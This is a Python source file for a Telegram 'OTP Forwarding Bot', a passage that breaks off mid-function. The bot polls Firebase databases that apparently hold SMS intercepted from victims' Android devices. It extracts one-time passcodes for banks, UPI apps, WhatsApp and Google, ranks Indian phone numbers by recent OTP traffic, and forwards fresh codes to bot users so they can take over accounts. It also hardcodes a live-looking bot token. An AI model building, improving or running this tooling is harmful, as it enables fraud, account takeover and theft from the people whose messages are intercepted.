#!/usr/bin/env python3
"""
OTP Forwarding Bot - Advanced Live Number System v3.2

v3.2 fixes:
- SEEN_OTP_CODES global dedup: (number, code) pairs tracked to prevent
  the same OTP code from being recorded for the same number more than once
  within a 10-minute window. This is the ultimate backstop against inflation.
- Cooldown period (60s) after initial scan — new OTPs get small boost only
- Per-path SMS dedup (not merged update) — prevents cross-path key collisions
- OTP logged once per OTP event, not once per number
- Tighter extract_otp regex — fewer false positives
- If hash changes and many SMS appear "new", apply cooldown boost automatically
"""

import re, time, asyncio, logging, random, hashlib
from typing import Optional, Dict, List, Set, Tuple
from collections import defaultdict, deque
from datetime import datetime
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from databases import DATABASES

logging.basicConfig(format="%(asctime)s [%(levelname)s] %(message)s", level=logging.INFO)
logger = logging.getLogger("OTPFwd")

# ── CONFIG ─────────────────────────────────────────────────────────────────────
ADMIN_ID = 8804372477
TOKEN = "8597129727:AAHZ6l73aLE_Dke3CedFkn57odm8Nu7Ua70"
FB_TIMEOUT = 20
POLL_INTERVAL = 0.5
MAX_CONCURRENT_POLL = 40
MAX_CONCURRENT_DB = 20
SMS_SEEN_MAX = 300000
AUTO_TIMEOUT = 300
HOT_WINDOW = 300
SCORE_DECAY = 0.95
MIN_SCORE_THRESHOLD = 0.1
MAX_SCORE = 100.0
INITIAL_OTP_BOOST = 5.0
NEW_OTP_BOOST = 15.0
COOLDOWN_OTP_BOOST = 3.0   # reduced boost during cooldown / suspicious burst
COOLDOWN_PERIOD = 60.0      # seconds after initial scan
OTP_DEDUP_WINDOW = 600      # 10 minutes: same (number, code) pair ignored within this
OTP_DEDUP_MAX = 200000      # max entries in OTP dedup set

# ── DATA STRUCTURES ────────────────────────────────────────────────────────────
class DeviceInfo:
    __slots__ = ['dev_id', 'numbers', 'status', 'base_url', 'db_tag',
                 'sms_paths', 'keys', 'last_sms_hash', 'last_poll_time', 'poll_count',
                 'initial_scan_done']
    def __init__(self, dev_id, numbers, status, base_url, db_tag, sms_paths, keys):
        self.dev_id = dev_id
        self.numbers = numbers
        self.status = status
        self.base_url = base_url
        self.db_tag = db_tag
        self.sms_paths = sms_paths
        self.keys = keys
        self.last_sms_hash = None
        self.last_poll_time = 0
        self.poll_count = 0
        self.initial_scan_done = False

class NumberProfile:
    """Tracks OTP activity score for a single number."""
    __slots__ = ['number', 'score', 'total_otps', 'last_otp_time', 'last_otp_code',
                 'last_otp_sender', 'otp_history', 'is_live', 'assigned_to',
                 'historical_otps']
    def __init__(self, number: str):
        self.number = number
        self.score = 0.0
        self.total_otps = 0
        self.last_otp_time = 0.0
        self.last_otp_code = ""
        self.last_otp_sender = ""
        self.otp_history: deque = deque(maxlen=50)
        self.is_live = False
        self.assigned_to: Optional[int] = None
        self.historical_otps = 0

    def record_otp(self, code: str, sender: str = "", is_initial_scan: bool = False,
                   is_cooldown: bool = False):
        """Record an OTP. Returns True if this is a genuinely new (number,code) pair."""
        # ── GLOBAL DEDUP CHECK ──
        # This is the backstop: if (number, code) was seen recently, skip entirely
        if not is_initial_scan:
            if not otp_code_seen(self.number, code):
                return False  # Already seen this code for this number recently

        now = time.time()
        self.total_otps += 1
        self.last_otp_code = code
        self.last_otp_sender = sender

        if is_initial_scan:
            # Historical OTPs — don't pollute otp_history or last_otp_time
            # These are NOT "recent" OTPs; they just tell us the number CAN receive OTPs
            self.historical_otps += 1
            self.score += INITIAL_OTP_BOOST
        elif is_cooldown:
            # Cooldown/burst — small boost, but track as recent
            self.last_otp_time = now
            self.otp_history.append(now)
            self.score += COOLDOWN_OTP_BOOST
        else:
            # Genuinely new OTP — full boost, track in history
            self.last_otp_time = now
            self.otp_history.append(now)
            self.score += NEW_OTP_BOOST

        if self.score > MAX_SCORE:
            self.score = MAX_SCORE

        self.is_live = self.score >= MIN_SCORE_THRESHOLD
        return True

    def decay(self):
        self.score *= SCORE_DECAY
        now = time.time()
        recent = sum(1 for t in self.otp_history if now - t < HOT_WINDOW)
        # Modest recent-activity bonus: capped to avoid inflation
        recent_bonus = min(recent * 0.5, 15.0)
        self.score += recent_bonus
        if self.score > MAX_SCORE:
            self.score = MAX_SCORE
        self.is_live = (self.score >= MIN_SCORE_THRESHOLD and
                        (self.last_otp_time > 0 and
                         (now - self.last_otp_time) < HOT_WINDOW * 2))

    @property
    def seconds_since_last_otp(self) -> float:
        if self.last_otp_time == 0:
            return 999999
        return time.time() - self.last_otp_time

    @property
    def recent_otp_count(self) -> int:
        now = time.time()
        return sum(1 for t in self.otp_history if now - t < HOT_WINDOW)

    @property
    def live_status_emoji(self) -> str:
        if self.last_otp_time == 0:
            return "💀"
        secs = time.time() - self.last_otp_time
        if secs < 60:
            return "🔥"
        elif secs < 300:
            return "🟢"
        elif secs < 900:
            return "🟡"
        elif secs < 3600:
            return "🟠"
        else:
            return "💀"

# ── GLOBAL STATE ───────────────────────────────────────────────────────────────
ALL_DEVICES: List[DeviceInfo] = []
NUM_TO_DEVICES: Dict[str, List[DeviceInfo]] = defaultdict(list)
ALL_ONLINE_NUMBERS: Set[str] = set()
NUMBER_PROFILES: Dict[str, NumberProfile] = {}
USER_WAITING: Dict[int, str] = {}
USER_WAIT_TIME: Dict[int, float] = {}
SEEN_SMS: Set[str] = set()
_seen_sms_list: List[str] = []
_seen_sms_max = SMS_SEEN_MAX

# ── OTP CODE DEDUP ─────────────────────────────────────────────────────────────
# Global dedup: (number, code, time_bucket) → prevents same (number, code) pair
# from being recorded multiple times within OTP_DEDUP_WINDOW seconds
_OTP_CODE_SEEN: Dict[Tuple[str, str], float] = {}  # (number, code) → timestamp

def otp_code_seen(number: str, code: str) -> bool:
    """
    Check if this (number, code) pair is genuinely new.
    Returns True if new (should be recorded), False if duplicate (should be skipped).
    Also cleans up old entries.
    """
    key = (number, code)
    now = time.time()

    if key in _OTP_CODE_SEEN:
        last_time = _OTP_CODE_SEEN[key]
        if now - last_time < OTP_DEDUP_WINDOW:
            return False  # Duplicate within window — skip

    # New or expired — mark as seen
    _OTP_CODE_SEEN[key] = now

    # Periodic cleanup: remove entries older than OTP_DEDUP_WINDOW
    if len(_OTP_CODE_SEEN) > OTP_DEDUP_MAX:
        cutoff = now - OTP_DEDUP_WINDOW
        expired_keys = [k for k, v in _OTP_CODE_SEEN.items() if v < cutoff]
        for k in expired_keys:
            del _OTP_CODE_SEEN[k]

    return True

_allowed_users: Set[int] = {ADMIN_ID}
_session: Optional[aiohttp.ClientSession] = None
_app: Optional[Application] = None
_scan_done = False
_scan_running = False
_initial_sms_scan_done = False
_initial_scan_complete_time: float = 0.0
_live_ranking: List[str] = []

def seen_add(sid: str):
    if sid not in SEEN_SMS:
        SEEN_SMS.add(sid)
        _seen_sms_list.append(sid)
        if len(_seen_sms_list) > _seen_sms_max:
            old = _seen_sms_list[:_seen_sms_max // 2]
            for o in old:
                SEEN_SMS.discard(o)
            del _seen_sms_list[:_seen_sms_max // 2]

def is_in_cooldown() -> bool:
    if _initial_scan_complete_time == 0:
        return False
    return (time.time() - _initial_scan_complete_time) < COOLDOWN_PERIOD

# ── SSL / SESSION ─────────────────────────────────────────────────────────────
async def get_session() -> aiohttp.ClientSession:
    global _session
    if _session is None or _session.closed:
        _session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=300, keepalive_timeout=30)
        )
    return _session

# ── FIREBASE GET ──────────────────────────────────────────────────────────────
async def fb_get(path: str, base: str, keys: list, retries: int = 2) -> Optional[dict]:
    s = await get_session()
    urls = []
    if not keys:
        urls.append(f"{base}/{path}.json" if path else f"{base}/.json")
    else:
        for k in keys:
            urls.append(f"{base}/{path}.json?auth={k}" if path else f"{base}/.json?auth={k}")

    for attempt in range(retries):
        for url in urls:
            try:
                async with s.get(url, timeout=aiohttp.ClientTimeout(total=FB_TIMEOUT)) as r:
                    if r.status == 200:
                        data = await r.json(content_type=None)
                        if isinstance(data, dict):
                            return data
                        return None
                    elif r.status == 401:
                        continue
                    elif r.status == 404:
                        return None
            except (aiohttp.ClientError, asyncio.TimeoutError):
                pass
            except Exception:
                pass
        if attempt < retries - 1:
            await asyncio.sleep(0.2 * (attempt + 1))
    return None

# ── EXTRACTION ────────────────────────────────────────────────────────────────
KEYS_CHECK = ["sim1Number", "sim2Number", "numberSim1", "numberSim2",
              "mobNo", "phoneNumber", "phone", "mobile"]

def extract_nums(*dicts) -> List[str]:
    nums = []
    for d in dicts:
        if not isinstance(d, dict): continue
        for k in KEYS_CHECK:
            v = str(d.get(k, ""))
            c = re.sub(r"\D", "", v)
            if len(c) >= 10:
                nums.append(c[-10:])
    return list(set(nums))

def extract_otp(body: str) -> Optional[str]:
    """Extract OTP code from SMS body. Tightened to reduce false positives."""
    # Priority 1: Keyword-based match (most reliable)
    kw_match = re.search(
        r"(?:otp|verif(?:ication|y)?|code|pin|passcode|token|one.time|secret)"
        r"[^\d]{0,20}(\d{4,8})\b",
        body, re.I
    )
    if kw_match:
        return kw_match.group(1)

    # Priority 2: Branded service match
    branded_match = re.search(
        r"(?:whatsapp|google|facebook|fb|amazon|flipkart|instagram|twitter|telegram"
        r"|bank|paytm|phonepe|gpay|upi|sbm|hdfc|icici|axis|sbi|pnb|bob)"
        r"[^\d]{0,30}(\d{4,6})\b",
        body, re.I
    )
    if branded_match:
        return branded_match.group(1)

    # Priority 3: Fallback — only if SMS is short (likely OTP message)
    # Skip long messages — they often contain amounts, IDs, etc.
    if len(body) > 200:
        return None
    fallback = re.search(r"(?<!\d)(\d{4,6})(?!\d)", body)
    if fallback:
        code = fallback.group(1)
        # Filter obvious non-OTP patterns
        try:
            val = int(code)
            # Years
            if 1900 <= val <= 2099:
                return None
            # Round numbers (amounts: 50000, 70000, 33500)
            if val % 1000 == 0 or val % 500 == 0:
                return None
            # Very low 4-digit (dates, times: 1000-1299)
            if val < 1300 and len(code) == 4:
                return None
        except:
            pass
        return code

    return None

# ── ADMIN ─────────────────────────────────────────────────────────────────────
async def send_admin(text: str):
    if _app:
        try:
            await _app.bot.send_message(ADMIN_ID, text[:4000])
        except: pass

# ── KEYBOARD BUILDERS ─────────────────────────────────────────────────────────
def main_keyboard(is_admin=False):
    buttons = [
        [InlineKeyboardButton("🔥 Get Live Number", callback_data="get")],
        [InlineKeyboardButton("🔍 My Status", callback_data="my"),
         InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
    ]
    if is_admin:
        buttons.append([InlineKeyboardButton("📊 Status", callback_data="status"),
                        InlineKeyboardButton("🔄 Rescan", callback_data="rescan")])
        buttons.append([InlineKeyboardButton("🔥 Live Numbers", callback_data="livenums"),
                        InlineKeyboardButton("💀 Dead Numbers", callback_data="deadnums")])
        buttons.append([InlineKeyboardButton("📈 Top Numbers", callback_data="topnums")])
    return InlineKeyboardMarkup(buttons)

def live_number_keyboard(numbers: List[Tuple[str, NumberProfile]], page=0, per_page=10):
    buttons = []
    start = page * per_page
    end = min(start + per_page, len(numbers))
    for i in range(start, end):
        num, prof = numbers[i]
        emoji = prof.live_status_emoji
        secs = int(prof.seconds_since_last_otp)
        if secs < 60:
            time_str = f"{secs}s ago"
        elif secs < 3600:
            time_str = f"{secs // 60}m ago"
        else:
            time_str = f"{secs // 3600}h ago"
        label = f"{emoji} +91{num} | S:{prof.score:.0f} | {time_str}"
        if prof.assigned_to:
            label += " [BUSY]"
        cb = f"pick_{num}" if not prof.assigned_to else "none"
        buttons.append([InlineKeyboardButton(label, callback_data=cb)])
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"lpage_{page-1}"))
    if end < len(numbers):
        nav.append(InlineKeyboardButton("➡️ Next", callback_data=f"lpage_{page+1}"))
    if nav:
        buttons.append(nav)
    buttons.append([InlineKeyboardButton("🔙 Menu", callback_data="back_main")])
    return InlineKeyboardMarkup(buttons)

def back_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Menu", callback_data="back_main")]])

def otp_received_keyboard(num=None):
    buttons = [
        [InlineKeyboardButton("❌ Stop Waiting", callback_data="cancel")],
        [InlineKeyboardButton("🔥 Get New Number", callback_data="get"),
         InlineKeyboardButton("🏠 Menu", callback_data="back_main")]
    ]
    return InlineKeyboardMarkup(buttons)

# ── DATABASE SCANNER ──────────────────────────────────────────────────────────
async def scan_all_databases():
    global ALL_DEVICES, NUM_TO_DEVICES, ALL_ONLINE_NUMBERS, NUMBER_PROFILES, _scan_done, _scan_running, _live_ranking
    if _scan_running:
        return
    _scan_running = True
    logger.info("Starting full database scan...")
    sem = asyncio.Semaphore(MAX_CONCURRENT_DB)
    all_devs = []

    async def scan_one(tag, cfg):
        async with sem:
            try:
                sim_r, dev_r, usr_r = await asyncio.gather(
                    fb_get("All_Users/simDetails", cfg["url"], cfg["keys"]),
                    fb_get("All_Users/Data/DeviceInfo", cfg["url"], cfg["keys"]),
                    fb_get("user_data", cfg["url"], cfg["keys"]),
                    return_exceptions=True
                )
                if isinstance(sim_r, dict):
                    info_r = dev_r if isinstance(dev_r, dict) else {}
                    for did, sim in sim_r.items():
                        if not isinstance(sim, dict): continue
                        info = info_r.get(did) if isinstance(info_r, dict) else {}
                        if not isinstance(info, dict): info = {}
                        nums = extract_nums(sim, info)
                        st = "online" if str(info.get("Status", "")).lower() == "online" else "offline"
                        if nums:
                            all_devs.append(DeviceInfo(did, nums, st, cfg["url"], tag,
                                [f"All_Users/sms/{did}"], cfg["keys"]))
                if isinstance(usr_r, dict):
                    for did, data in usr_r.items():
                        if not isinstance(data, dict): continue
                        nums = extract_nums(data)
                        st = "online" if str(data.get("status", "")).lower() == "online" else "offline"
                        if nums:
                            all_devs.append(DeviceInfo(did, nums, st, cfg["url"], tag,
                                [f"user_sms/{did}", f"All_Users/sms/{did}"], cfg["keys"]))
            except Exception as e:
                logger.debug(f"scan_one {tag}: {e}")

    tasks = [scan_one(t, c) for t, c in DATABASES.items()]
    await asyncio.gather(*tasks, return_exceptions=True)

    ALL_DEVICES = all_devs
    NUM_TO_DEVICES.clear()
    online_nums = set()
    for d in ALL_DEVICES:
        for n in d.numbers:
            NUM_TO_DEVICES[n].append(d)
        if d.status == "online":
            for n in d.numbers:
                online_nums.add(n)

    ALL_ONLINE_NUMBERS = online_nums

    new_profiles = {}
    for n in online_nums:
        if n in NUMBER_PROFILES:
            new_profiles[n] = NUMBER_PROFILES[n]
        else:
            new_profiles[n] = NumberProfile(n)
    NUMBER_PROFILES = new_profiles

    update_live_ranking()
    _scan_done = True
    _scan_running = False
    online_devs = sum(1 for d in ALL_DEVICES if d.status == "online")
    live_count = sum(1 for p in NUMBER_PROFILES.values() if p.is_live)
    logger.info(f"Scan done: {len(ALL_DEVICES)} devs, {online_devs} online, {len(online_nums)} numbers, {live_count} live")
    await send_admin(
        f"✅ Scan complete!\n"
        f"Devices: {online_devs} online / {len(ALL_DEVICES)} total\n"
        f"Numbers: {len(online_nums)} total\n"
        f"🔥 Live: {live_count} | 💀 Dead: {len(online_nums) - live_count}\n\n"
        f"Now doing initial SMS scan to rank numbers...")

# ── INITIAL SMS SCAN ──────────────────────────────────────────────────────────
async def initial_sms_scan():
    """
    Scan ALL historical SMS once at startup to:
    1. Pre-seed SEEN_SMS so we don't re-process old messages
    2. Pre-seed _OTP_CODE_SEEN so we don't re-score old OTP codes
    3. Give numbers a small initial score based on historical OTP count
    """
    global _initial_sms_scan_done, _initial_scan_complete_time
    if _initial_sms_scan_done:
        return

    logger.info("Starting initial SMS scan (pre-seeding)...")
    online_devs = [d for d in ALL_DEVICES if d.status == "online"]
    sem = asyncio.Semaphore(MAX_CONCURRENT_DB)

    total_sms = 0
    total_otps = 0

    async def scan_device_sms(dev: DeviceInfo):
        nonlocal total_sms, total_otps
        async with sem:
            hash_parts = []
            for sms_path in dev.sms_paths:
                data = await fb_get(sms_path, dev.base_url, dev.keys)
                if not isinstance(data, dict):
                    hash_parts.append("")
                    continue

                hash_parts.append(str(sorted(data.items())))

                for sms_key, sms in data.items():
                    if not isinstance(sms, dict):
                        continue

                    sid = f"{dev.db_tag}/{dev.dev_id}/{sms_path}/{sms_key}"
                    seen_add(sid)
                    total_sms += 1

                    body = str(sms.get("body") or sms.get("message") or sms.get("text") or sms.get("msg") or "")
                    sender = str(sms.get("sender") or sms.get("from") or sms.get("address") or "")

                    otp = extract_otp(body)
                    if not otp:
                        continue

                    total_otps += 1
                    for num in dev.numbers:
                        if num in NUMBER_PROFILES:
                            # Record with initial scan boost (small)
                            NUMBER_PROFILES[num].record_otp(otp, sender, is_initial_scan=True)
                            # Also pre-seed the OTP code dedup so these codes aren't re-scored
                            _OTP_CODE_SEEN[(num, otp)] = time.time()

            if any(p for p in hash_parts):
                combined = "|".join(hash_parts)
                dev.last_sms_hash = hashlib.md5(combined.encode()).hexdigest()

            dev.initial_scan_done = True

    batch_size = MAX_CONCURRENT_DB
    for i in range(0, len(online_devs), batch_size):
        batch = online_devs[i:i+batch_size]
        await asyncio.gather(*[scan_device_sms(d) for d in batch], return_exceptions=True)

    _initial_sms_scan_done = True
    _initial_scan_complete_time = time.time()

    # Normalize initial scores — aggressive cap to prevent inflation
    for prof in NUMBER_PROFILES.values():
        prof.score *= 0.1
        if prof.score > 10.0:
            prof.score = 10.0

    update_live_ranking()

    live_count = sum(1 for p in NUMBER_PROFILES.values() if p.is_live)
    top_nums = sorted(NUMBER_PROFILES.items(), key=lambda x: x[1].score, reverse=True)[:5]
    top_str = "\n".join([f"  +91{n} (S:{p.score:.1f}, hist:{p.historical_otps} OTPs)" for n, p in top_nums])

    logger.info(f"Initial SMS scan done: {total_sms} SMS seen, {total_otps} historical OTPs found, {_len_otp_dedup()} OTP dedup entries")
    await send_admin(
        f"✅ Initial SMS scan complete!\n"
        f"📩 {total_sms} historical SMS pre-seeded\n"
        f"🔑 {total_otps} historical OTPs found\n"
        f"🔒 {_len_otp_dedup()} OTP dedup entries\n"
        f"🔥 Live numbers: {live_count}\n\n"
        f"🏆 Top numbers:\n{top_str}\n\n"
        f"⚡ Bot is now LIVE and monitoring for NEW OTPs!")

def _len_otp_dedup() -> int:
    return len(_OTP_CODE_SEEN)

# ── RANKING & SELECTION ───────────────────────────────────────────────────────
def update_live_ranking():
    global _live_ranking
    scored = [(n, p) for n, p in NUMBER_PROFILES.items() if p.assigned_to is None]
    scored.sort(key=lambda x: x[1].score, reverse=True)
    _live_ranking = [n for n, _ in scored]

def get_best_number() -> Optional[str]:
    update_live_ranking()
    for n in _live_ranking:
        prof = NUMBER_PROFILES[n]
        if prof.assigned_to is None and prof.is_live:
            return n
    for n in _live_ranking:
        prof = NUMBER_PROFILES[n]
        if prof.assigned_to is None and prof.score > 1.0:
            return n
    for n in _live_ranking:
        prof = NUMBER_PROFILES[n]
        if prof.assigned_to is None:
            return n
    return None

def get_top_numbers(count=20) -> List[Tuple[str, NumberProfile]]:
    update_live_ranking()
    result = []
    for n in _live_ranking[:count * 3]:
        prof = NUMBER_PROFILES[n]
        result.append((n, prof))
        if len(result) >= count:
            break
    return result

# ── BACKGROUND SMS MONITOR ─────────────────────────────────────────────────────
async def monitor_sms_for_device(dev: DeviceInfo, is_initial_phase: bool = False):
    """Poll SMS from one device, update number profiles with OTP activity."""
    cooldown = is_in_cooldown()

    hash_parts = []
    new_sms_list = []

    for sms_path in dev.sms_paths:
        data = await fb_get(sms_path, dev.base_url, dev.keys)
        if isinstance(data, dict):
            hash_parts.append(str(sorted(data.items())))

            for sms_key, sms in data.items():
                if not isinstance(sms, dict):
                    continue
                sid = f"{dev.db_tag}/{dev.dev_id}/{sms_path}/{sms_key}"
                if sid in SEEN_SMS:
                    continue
                seen_add(sid)
                new_sms_list.append(sms)
        else:
            hash_parts.append("")

    if not hash_parts or all(p == "" for p in hash_parts):
        return

    combined = "|".join(hash_parts)
    data_hash = hashlib.md5(combined.encode()).hexdigest()
    if data_hash == dev.last_sms_hash and not new_sms_list:
        return
    dev.last_sms_hash = data_hash

    # If we found many new SMS at once, it's likely a hash-miss / residual scan
    # Force cooldown mode for this device to prevent score inflation
    is_burst = len(new_sms_list) > 5
    effective_cooldown = cooldown or is_burst

    if is_burst:
        logger.info(f"⚡ Burst detected: {len(new_sms_list)} new SMS for device {dev.dev_id} — using cooldown boost")

    for sms in new_sms_list:
        body = str(sms.get("body") or sms.get("message") or sms.get("text") or sms.get("msg") or "")
        sender = str(sms.get("sender") or sms.get("from") or sms.get("address") or "")
        timestamp = str(sms.get("date") or sms.get("time") or sms.get("timestamp") or "")

        otp = extract_otp(body)
        if not otp:
            continue

        # record_otp checks _OTP_CODE_SEEN internally — duplicate (number, code) pairs are skipped
        numbers_notified = []
        for num in dev.numbers:
            if num in NUMBER_PROFILES:
                was_new = NUMBER_PROFILES[num].record_otp(
                    otp, sender, is_initial_scan=False, is_cooldown=effective_cooldown)
                if was_new:
                    numbers_notified.append(num)

        if numbers_notified:
            nums_str = ", ".join(f"+91{n}" for n in numbers_notified)
            first_prof = NUMBER_PROFILES[numbers_notified[0]]
            burst_tag = " [burst/cooldown]" if effective_cooldown else ""
            logger.info(f"🔥 NEW OTP{burst_tag}: code={otp} → {nums_str} | score={first_prof.score:.1f}")

        # Forward to waiting users
        for num in dev.numbers:
            for uid, wnum in list(USER_WAITING.items()):
                if wnum == num and _app:
                    logger.info(f"📧 Forward match: +91{num} for user {uid} (waiting for +91{wnum})")
                    try:
                        await _app.bot.send_message(uid,
                            f"⚡ OTP RECEIVED!\n\n"
                            f"📱 Number: +91{num}\n"
                            f"🔑 OTP: <code>{otp}</code>\n"
                            f"📤 Sender: {sender}\n"
                            f"💬 Message: {body[:300]}\n"
                            f"🕐 Time: {timestamp}\n\n"
                            f"⚡ Delivered instantly!\n"
                            f"📩 More OTPs will be forwarded as they arrive.",
                            parse_mode="HTML", reply_markup=otp_received_keyboard(num))
                        logger.info(f"OTP forwarded: +91{num} -> user {uid}")
                    except Exception as e:
                        logger.warning(f"Failed to forward OTP to {uid}: {e}")
                    # Keep user in USER_WAITING — they'll keep receiving OTPs
                    # until they cancel or time out

async def background_monitor_loop():
    """Continuously monitor ALL online devices for OTP activity and score numbers."""
    await asyncio.sleep(5)
    logger.info("Background monitor loop started")
    cycle = 0
    while True:
        try:
            if not ALL_DEVICES:
                await asyncio.sleep(3)
                continue

            if not _initial_sms_scan_done:
                await asyncio.sleep(1)
                continue

            # ── PHASE 1: Poll devices ──
            online_devs = [d for d in ALL_DEVICES if d.status == "online"]
            waiting_nums = set(USER_WAITING.values())

            if waiting_nums and cycle % 30 == 0:  # Log every 30 cycles
                logger.info(f"👀 Waiting numbers: {waiting_nums}")

            priority_devs = [d for d in online_devs if any(n in waiting_nums for n in d.numbers)]
            other_devs = [d for d in online_devs if d not in priority_devs]

            sem = asyncio.Semaphore(MAX_CONCURRENT_POLL)

            if priority_devs:
                async def poll_p(dev):
                    async with sem:
                        await monitor_sms_for_device(dev)
                await asyncio.gather(*[poll_p(d) for d in priority_devs], return_exceptions=True)

            batch_size = MAX_CONCURRENT_POLL
            if other_devs:
                start_idx = (cycle * batch_size) % len(other_devs) if other_devs else 0
                batch = other_devs[start_idx:start_idx + batch_size]
                if len(batch) < batch_size and len(other_devs) > batch_size:
                    remaining = batch_size - len(batch)
                    batch += other_devs[:remaining]

                if batch:
                    async def poll_o(dev):
                        async with sem:
                            await monitor_sms_for_device(dev)
                    await asyncio.gather(*[poll_o(d) for d in batch], return_exceptions=True)

            # ── PHASE 2: Decay and rank ──
            cycle += 1
            if cycle % 10 == 0:
                for prof in NUMBER_PROFILES.values():
                    prof.decay()
                update_live_ranking()

            # ── PHASE 3: Auto-timeout ──
            now = time.time()
            expired = [(uid, num) for uid, num in USER_WAITING.items()
                       if uid in USER_WAIT_TIME and now - USER_WAIT_TIME[uid] > AUTO_TIMEOUT]
            for uid, num in expired:
                if uid in USER_WAITING and USER_WAITING[uid] == num:
                    del USER_WAITING[uid]
                    USER_WAIT_TIME.pop(uid, None)
                    if num in NUMBER_PROFILES:
                        NUMBER_PROFILES[num].assigned_to = None
                    try:
                        await _app.bot.send_message(uid,
                            f"⏰ Timed out waiting for OTP on +91{num}",
                            reply_markup=InlineKeyboardMarkup([
                                [InlineKeyboardButton("🔥 Get Live Number", callback_data="get")],
                                [InlineKeyboardButton("🔙 Menu", callback_data="back_main")]
                            ]))
                    except: pass

            # ── PHASE 4: Admin status ──
            if cycle % 600 == 0:
                live_count = sum(1 for p in NUMBER_PROFILES.values() if p.is_live)
                in_use = sum(1 for p in NUMBER_PROFILES.values() if p.assigned_to is not None)
                await send_admin(
                    f"📊 Monitor running ({cycle} cycles)\n"
                    f"🔥 Live: {live_count} | 🔒 In use: {in_use}\n"
                    f"📩 SMS seen: {len(SEEN_SMS)}\n"
                    f"🔒 OTP dedup: {_len_otp_dedup()}\n"
                    f"⏳ Waiting: {len(USER_WAITING)}")

        except Exception as e:
            logger.error(f"Monitor loop error: {e}")

        await asyncio.sleep(POLL_INTERVAL)

# ── CALLBACK HANDLER ──────────────────────────────────────────────────────────
async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data = query.data
    is_admin = (uid == ADMIN_ID)

    if uid not in _allowed_users:
        await query.edit_message_text("⛔ Not authorized. Contact admin.",
                                       reply_markup=back_keyboard())
        return

    # ── BACK TO MAIN ──
    if data == "back_main":
        if not _scan_done:
            await query.edit_message_text("⏳ System scanning... Please wait.",
                                           reply_markup=back_keyboard())
        else:
            live_count = sum(1 for p in NUMBER_PROFILES.values() if p.is_live)
            avail = sum(1 for n, p in NUMBER_PROFILES.items() if p.assigned_to is None)
            await query.edit_message_text(
                f"🤖 OTP Forwarding Bot\n\n"
                f"🔥 Live Numbers: {live_count}\n"
                f"📱 Available: {avail}\n"
                f"👥 Waiting: {len(USER_WAITING)}\n"
                f"📈 Total Numbers: {len(NUMBER_PROFILES)}\n\n"
                f"Tap a button below 👇",
                reply_markup=main_keyboard(is_admin))
        return

    # ── GET LIVE NUMBER ──
    if data == "get":
        if not _scan_done:
            await query.edit_message_text("⏳ Scanning... wait a moment.",
                                           reply_markup=back_keyboard())
            return
        if not _initial_sms_scan_done:
            await query.edit_message_text("⏳ Initial SMS scan in progress... Almost ready!",
                                           reply_markup=back_keyboard())
            return
        if uid in USER_WAITING:
            num = USER_WAITING[uid]
            prof = NUMBER_PROFILES.get(num)
            elapsed = time.time() - USER_WAIT_TIME.get(uid, time.time())
            remaining = max(0, AUTO_TIMEOUT - elapsed)
            score_str = f"{prof.score:.0f}" if prof else "?"
            emoji = prof.live_status_emoji if prof else "💀"
            await query.edit_message_text(
                f"⏳ Already waiting for +91{num}\n"
                f"{emoji} Score: {score_str}\n"
                f"⏱ Time remaining: {int(remaining)}s\n\n"
                f"Cancel first to get a different number.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("❌ Cancel Current", callback_data="cancel")],
                    [InlineKeyboardButton("🔙 Menu", callback_data="back_main")]
                ]))
            return

        num = get_best_number()
        if not num:
            await query.edit_message_text(
                "❌ No available numbers right now.\nTry rescan later.",
                reply_markup=back_keyboard())
            return

        prof = NUMBER_PROFILES[num]
        prof.assigned_to = uid
        USER_WAITING[uid] = num
        USER_WAIT_TIME[uid] = time.time()
        logger.info(f"📋 User {uid} assigned number +91{num} (score={prof.score:.1f}, live={prof.is_live})")
        logger.info(f"📋 USER_WAITING now: {dict(USER_WAITING)}")

        devs = NUM_TO_DEVICES.get(num, [])
        online_panels = sum(1 for d in devs if d.status == "online")
        secs = int(prof.seconds_since_last_otp)
        if secs < 60:
            last_str = f"{secs}s ago"
        elif secs < 3600:
            last_str = f"{secs // 60}m ago"
        else:
            last_str = "waiting"

        emoji = prof.live_status_emoji
        status_text = {
            "🔥": "🔥 HOT - OTP just now!",
            "🟢": "🟢 LIVE - OTP recently!",
            "🟡": "🟡 WARM - OTP incoming",
            "🟠": "🟠 COOLING - Slow activity",
            "💀": "💀 IDLE - Waiting for activity"
        }.get(emoji, "Unknown")

        await query.edit_message_text(
            f"📱 Number Assigned!\n\n"
            f"Number: +91{num}\n"
            f"{status_text}\n"
            f"📊 Score: {prof.score:.0f}\n"
            f"🔑 Last OTP: {last_str}\n"
            f"📈 Recent OTPs (5m): {prof.recent_otp_count}\n"
            f"💻 Live Panels: {online_panels}\n\n"
            f"⚡ I'm watching for SMS now!\n"
            f"⏱ Timeout: 5 minutes",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔍 Check Status", callback_data="my"),
                 InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
                [InlineKeyboardButton("🔙 Menu", callback_data="back_main")]
            ]))

    # ── LIVE NUMBERS LIST ──
    elif data == "livenums":
        if not is_admin: return
        live = [(n, NUMBER_PROFILES[n]) for n in _live_ranking if NUMBER_PROFILES[n].is_live and NUMBER_PROFILES[n].assigned_to is None]
        if not live:
            await query.edit_message_text("💀 No live numbers detected yet.\nMonitoring in progress...",
                                           reply_markup=back_keyboard())
            return
        await query.edit_message_text(
            f"🔥 Live Numbers ({len(live)})\n\nThese are actively receiving OTPs!\nTap to assign 👇",
            reply_markup=live_number_keyboard(live, page=0))

    # ── DEAD NUMBERS LIST ──
    elif data == "deadnums":
        if not is_admin: return
        dead = [(n, NUMBER_PROFILES[n]) for n in NUMBER_PROFILES if not NUMBER_PROFILES[n].is_live and NUMBER_PROFILES[n].assigned_to is None]
        dead.sort(key=lambda x: x[1].score, reverse=True)
        if not dead:
            await query.edit_message_text("All numbers are live! 🔥",
                                           reply_markup=back_keyboard())
            return
        await query.edit_message_text(
